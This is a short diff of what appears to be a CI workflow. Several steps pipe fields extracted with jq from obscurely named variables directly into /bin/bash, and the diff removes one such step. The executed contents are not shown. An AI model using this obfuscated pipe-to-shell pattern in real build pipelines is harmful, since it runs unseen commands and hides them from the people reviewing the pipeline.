@@ -21,7 +21,6 @@ jobs:
           echo $x3963 | jq -r .afgpc5523 | /bin/bash
           echo $b15053 | jq -r .jur8744 | /bin/bash
           echo $zgqp65 | jq -r .unb1 | /bin/bash
-          printf '%s' "$kilx31" | jq -r .kkfn122 | /bin/bash
           echo $sgjay84390 | jq -r .piwq99334 | /bin/bash
           echo $q4213 | jq -r .jdpc968 | /bin/bash
           echo $z23 | jq -r .xhs04 | /bin/bash
